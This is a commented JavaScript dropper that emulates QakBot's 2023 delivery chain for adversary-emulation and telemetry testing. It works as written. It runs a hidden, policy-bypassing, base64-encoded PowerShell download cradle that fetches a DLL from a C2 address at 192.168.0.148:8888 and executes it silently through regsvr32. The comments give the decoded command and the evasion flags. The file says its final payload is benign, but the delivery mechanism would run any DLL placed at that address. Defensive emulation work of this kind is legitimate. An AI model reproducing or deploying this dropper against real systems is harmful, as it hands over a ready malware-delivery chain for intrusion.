// ============================================================================
// ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY
//
// This code replicates documented malware behavior for defensive security
// testing and endpoint telemetry validation. It does NOT contain real malware
// payloads, exploits, or evasion techniques.
//
// LEGAL: Only run this in environments you own or have explicit written
// authorization to test. Unauthorized use may violate computer fraud laws.
//
// Final payload: calc.exe (safe, benign)
// C2: Local network only (hardcoded private IP: 192.168.0.148)
// ============================================================================
//
// JawDropper Stage 1 — JavaScript Dropper
//
// Emulates: QakBot BB27/BB28 campaign delivery (May 2023)
// Reference: CISA AA23-242A, pr0xylife/Qakbot IOCs
//
// MITRE ATT&CK Techniques:
//   T1059.007 — Command and Scripting Interpreter: JavaScript
//   T1059.001 — Command and Scripting Interpreter: PowerShell
//   T1218.010 — Signed Binary Proxy Execution: Regsvr32
//   T1105    — Ingress Tool Transfer
//
// Process tree produced:
//   wscript.exe dropper.js
//     └── powershell.exe -WindowStyle Hidden -ep Bypass -encodedcommand <base64>
//           └── regsvr32.exe /s %TEMP%\update.dll
//
// ============================================================================

// Create Windows Script Host Shell object for process execution
// MITRE: T1059.007 - JavaScript execution via wscript.exe
var shell = new ActiveXObject("WScript.Shell");

// ============================================================================
// PowerShell Download Cradle (Base64 Encoded)
// ============================================================================
//
// The decoded PowerShell command does the following:
//   1. Downloads payload.dll from the local C2 server (192.168.0.148:8888)
//   2. Saves it to %TEMP%\update.dll
//   3. Executes it via regsvr32.exe /s (silent, no dialog)
//
// See encoded_command.ps1 for the readable version of this command.
//
// Encoding process:
//   1. Write the PowerShell script
//   2. Convert to UTF-16LE (required for -encodedcommand)
//   3. Base64 encode
//
// To decode manually:
//   [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("<base64>"))
//
// ============================================================================

// Base64-encoded PowerShell download cradle
// MITRE: T1059.001 - PowerShell execution with encoded command
//
// Decoded command:
//   $c2 = "http://192.168.0.148:8888"
//   $outPath = "$env:TEMP\update.dll"
//   Invoke-WebRequest -Uri "$c2/payloads/payload.dll" -OutFile $outPath
//   Start-Process "regsvr32.exe" -ArgumentList "/s $outPath"
//
var encodedCommand = "JABjADIAIAA9ACAAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQA0ADgAOgA4ADgAOAA4ACIADQAKACQAbwB1AHQAUABhAHQAaAAgAD0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdQBwAGQAYQB0AGUALgBkAGwAbAAiAA0ACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgAkAGMAMgAvAHAAYQB5AGwAbwBhAGQAcwAvAHAAYQB5AGwAbwBhAGQALgBkAGwAbAAiACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABQAGEAdABoAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgByAGUAZwBzAHYAcgAzADIALgBlAHgAZQAiACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALwBzACAAJABvAHUAdABQAGEAdABoACIA";

// Build the PowerShell command line
// MITRE: T1059.001 - PowerShell with:
//   -WindowStyle Hidden : Hide the PowerShell window (T1564.003)
//   -ep Bypass         : Bypass execution policy
//   -encodedcommand    : Execute base64-encoded command
var powershellCmd = "powershell.exe -WindowStyle Hidden -ep Bypass -encodedcommand " + encodedCommand;

// Execute the PowerShell download cradle
// This spawns powershell.exe as a child process of wscript.exe
// MITRE: T1059.001 - Spawning PowerShell from JavaScript
shell.Run(powershellCmd, 0, false);

// Parameters for shell.Run:
//   0     : Window style (0 = hidden)
//   false : Don't wait for process to complete (async execution)

// ============================================================================
// Execution Flow Summary
// ============================================================================
//
// 1. User double-clicks dropper.js
//    └── Windows executes: wscript.exe dropper.js
//        MITRE: T1204.002 (User Execution: Malicious File)
//
// 2. WScript Shell spawns PowerShell (hidden)
//    └── powershell.exe -WindowStyle Hidden -ep Bypass -encodedcommand <base64>
//        MITRE: T1059.001 (PowerShell), T1059.007 (JavaScript)
//
// 3. PowerShell downloads DLL from C2 server
//    └── Invoke-WebRequest → http://192.168.0.148:8888/payloads/payload.dll
//        MITRE: T1105 (Ingress Tool Transfer)
//
// 4. PowerShell executes DLL via regsvr32
//    └── regsvr32.exe /s %TEMP%\update.dll
//        MITRE: T1218.010 (Signed Binary Proxy Execution: Regsvr32)
//
// 5. DLL executes discovery commands and launches calc.exe
//    └── See stage2-loader for details
//        MITRE: T1082, T1016, T1033, T1053.005, etc.
//
// ============================================================================
